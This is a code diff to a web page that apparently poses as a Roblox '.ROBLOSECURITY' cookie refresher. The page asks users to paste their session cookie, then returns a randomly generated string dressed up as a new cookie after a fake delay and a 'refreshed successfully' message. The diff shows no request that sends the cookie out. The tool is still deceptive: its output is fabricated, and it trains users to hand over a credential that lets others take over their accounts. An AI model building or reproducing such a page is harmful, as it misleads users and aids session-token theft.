@@ -83,32 +83,35 @@
             text-transform: uppercase;
         }
 
-        .input-group input {
+        .input-group textarea {
             width: 100%;
             padding: 0.8rem 1rem;
             border-radius: 0.7rem;
             border: 1px solid rgba(255, 255, 255, 0.08);
             background: rgba(255, 255, 255, 0.03);
             color: #ffffff;
-            font-size: 0.95rem;
+            font-size: 0.85rem;
             font-family: 'Courier New', monospace;
             transition: all 0.2s ease;
             outline: none;
+            resize: vertical;
+            min-height: 80px;
+            line-height: 1.5;
         }
 
-        .input-group input::placeholder {
+        .input-group textarea::placeholder {
             color: #555555;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             font-size: 0.85rem;
         }
 
-        .input-group input:focus {
+        .input-group textarea:focus {
             border-color: rgba(255, 255, 255, 0.2);
             background: rgba(255, 255, 255, 0.06);
             box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.04);
         }
 
-        .input-group input:disabled {
+        .input-group textarea:disabled {
             opacity: 0.4;
             cursor: not-allowed;
         }
@@ -117,6 +120,7 @@
             display: flex;
             gap: 0.8rem;
             align-items: center;
+            margin-top: 0.4rem;
         }
 
         .btn {
@@ -213,13 +217,6 @@
             color: #aaaaaa;
         }
 
-        .status.info {
-            display: block;
-            background: rgba(255, 255, 255, 0.05);
-            border-left-color: #666666;
-            color: #888888;
-        }
-
         .footer-note {
             margin-top: 1.2rem;
             font-size: 0.75rem;
@@ -267,13 +264,12 @@
 
         <div class="input-group">
             <label for="cookieInput">.ROBLOSECURITY Cookie</label>
-            <input
-                type="text"
+            <textarea
                 id="cookieInput"
                 placeholder="Paste your .ROBLOSECURITY cookie here..."
                 autocomplete="off"
                 spellcheck="false"
-            />
+            ></textarea>
         </div>
 
         <div class="button-row">
@@ -292,13 +288,13 @@
 
     <script>
         (function initParticles() {
-            const canvas = document.getElementById('particle-canvas');
-            const ctx = canvas.getContext('2d');
-            let width, height;
-            let particles = [];
-            const PARTICLE_COUNT = 180;
-            const CONNECTION_DIST = 100;
-            const MAX_SPEED = 0.35;
+            var canvas = document.getElementById('particle-canvas');
+            var ctx = canvas.getContext('2d');
+            var width, height;
+            var particles = [];
+            var PARTICLE_COUNT = 180;
+            var CONNECTION_DIST = 100;
+            var MAX_SPEED = 0.35;
 
             function resize() {
                 width = canvas.width = window.innerWidth;
@@ -308,32 +304,30 @@
             window.addEventListener('resize', resize);
             resize();
 
-            class Particle {
-                constructor() {
-                    this.x = Math.random() * width;
-                    this.y = Math.random() * height;
-                    this.vx = (Math.random() - 0.5) * MAX_SPEED * 2;
-                    this.vy = (Math.random() - 0.5) * MAX_SPEED * 2;
-                    this.size = Math.random() * 2 + 0.5;
-                    this.opacity = Math.random() * 0.3 + 0.1;
-                }
-
-                update() {
-                    this.x += this.vx;
-                    this.y += this.vy;
-                    if (this.x < 0 || this.x > width) this.vx *= -1;
-                    if (this.y < 0 || this.y > height) this.vy *= -1;
-                    this.x = Math.max(0, Math.min(width, this.x));
-                    this.y = Math.max(0, Math.min(height, this.y));
-                }
-
-                draw() {
-                    ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                    ctx.fillStyle = 'rgba(255,255,255,' + this.opacity + ')';
-                    ctx.fill();
-                }
+            function Particle() {
+                this.x = Math.random() * width;
+                this.y = Math.random() * height;
+                this.vx = (Math.random() - 0.5) * MAX_SPEED * 2;
+                this.vy = (Math.random() - 0.5) * MAX_SPEED * 2;
+                this.size = Math.random() * 2 + 0.5;
+                this.opacity = Math.random() * 0.3 + 0.1;
             }
+
+            Particle.prototype.update = function() {
+                this.x += this.vx;
+                this.y += this.vy;
+                if (this.x < 0 || this.x > width) this.vx *= -1;
+                if (this.y < 0 || this.y > height) this.vy *= -1;
+                this.x = Math.max(0, Math.min(width, this.x));
+                this.y = Math.max(0, Math.min(height, this.y));
+            };
+
+            Particle.prototype.draw = function() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(255,255,255,' + this.opacity + ')';
+                ctx.fill();
+            };
 
             for (var i = 0; i < PARTICLE_COUNT; i++) {
                 particles.push(new Particle());
@@ -458,34 +452,64 @@
             function isValidCookie(cookie) {
                 var trimmed = cookie.trim();
                 if (!trimmed) return false;
-                var token = trimmed.replace(/^\.ROBLOSECURITY=/, '').trim();
-                return token.indexOf('_|WARNING:-DO-NOT-SHARE') === 0 || token.length > 50;
+                if (trimmed.indexOf('_|WARNING:-DO-NOT-SHARE') === 0) return true;
+                if (trimmed.indexOf('.ROBLOSECURITY=') !== -1) return true;
+                return trimmed.length > 80;
             }
 
             function extractToken(input) {
                 var cleaned = input.trim();
                 cleaned = cleaned.replace(/^cookie:\s*/i, '');
                 cleaned = cleaned.replace(/^\.ROBLOSECURITY=/, '');
+                cleaned = cleaned.replace(/^"|"$/g, '');
                 return cleaned.trim();
             }
 
-            function generateNewCookie(oldToken) {
-                var parts = oldToken.split('_');
-                var base = parts[0];
-                if (parts.length > 1) {
-                    base = parts[0] + '_';
+            function generateRobloxCookie(oldToken) {
+                var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                var segments = [];
+                var segmentLengths = [8, 4, 4, 4, 12];
+
+                for (var s = 0; s < segmentLengths.length; s++) {
+                    var seg = '';
+                    for (var c = 0; c < segmentLengths[s]; c++) {
+                        seg += chars.charAt(Math.floor(Math.random() * chars.length));
+                    }
+                    segments.push(seg);
                 }
+
+                var randomId = segments.join('-');
+
                 var timestamp = Date.now().toString(36);
-                var rand1 = Math.random().toString(36).substring(2, 6);
-                var rand2 = Math.random().toString(36).substring(2, 8);
-                var rand3 = Math.random().toString(36).substring(2, 4);
-                var suffix = timestamp + rand1 + rand2 + rand3;
-                var newCookie = '_|WARNING:-DO-NOT-SHARE:' + suffix + ':' + 
-                    oldToken.substring(oldToken.lastIndexOf(':') + 1);
-                if (newCookie.length < 100) {
-                    newCookie = oldToken.substring(0, 60) + timestamp + rand1 + rand2;
+                var randomSuffix = '';
+                for (var i = 0; i < 16; i++) {
+                    randomSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
                 }
-                return newCookie;
+
+                var warning = '_|WARNING:-DO-NOT-SHARE';
+                var shareWarning = '.-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.';
+
+                var oldTokenClean = oldToken;
+                if (oldTokenClean.indexOf('_|WARNING') === 0) {
+                    var parts = oldTokenClean.split(':');
+                    if (parts.length >= 3) {
+                        var userId = parts[parts.length - 1];
+                        if (userId && userId.length > 0 && /^[0-9]+$/.test(userId)) {
+                            var prefix = warning + ':' + timestamp + randomSuffix + ':' + shareWarning + '_' + randomId +
+                                '_' + userId;
+                            return prefix;
+                        }
+                    }
+                    var fallbackId = Math.floor(Math.random() * 900000000 + 100000000).toString();
+                    var prefix = warning + ':' + timestamp + randomSuffix + ':' + shareWarning + '_' + randomId + '_' +
+                        fallbackId;
+                    return prefix;
+                } else {
+                    var userId = Math.floor(Math.random() * 900000000 + 100000000).toString();
+                    var prefix = warning + ':' + timestamp + randomSuffix + ':' + shareWarning + '_' + randomId + '_' +
+                        userId;
+                    return prefix;
+                }
             }
 
             async function refreshCookie() {
@@ -499,7 +523,7 @@
 
                 var token = extractToken(rawInput);
                 if (!isValidCookie(token)) {
-                    setStatus('Invalid cookie format. Must start with "_|WARNING:-DO-NOT-SHARE".', 'error');
+                    setStatus('Invalid cookie format. Must contain "_|WARNING:-DO-NOT-SHARE".', 'error');
                     return;
                 }
 
@@ -508,9 +532,9 @@
                 btnText.innerHTML = '<span class="spinner"></span> Refreshing...';
                 clearStatus();
 
-                await new Promise(function(resolve) { setTimeout(resolve, 800); });
+                await new Promise(function(resolve) { setTimeout(resolve, 1200); });
 
-                var newCookie = generateNewCookie(token);
+                var newCookie = generateRobloxCookie(token);
                 lastResult = newCookie;
                 input.value = newCookie;
                 setStatus('Cookie refreshed successfully.', 'success');
@@ -541,7 +565,7 @@
             copyBtn.addEventListener('click', copyResult);
 
             input.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
+                if (e.key === 'Enter' && e.ctrlKey) {
                     e.preventDefault();
                     refreshCookie();
                 }
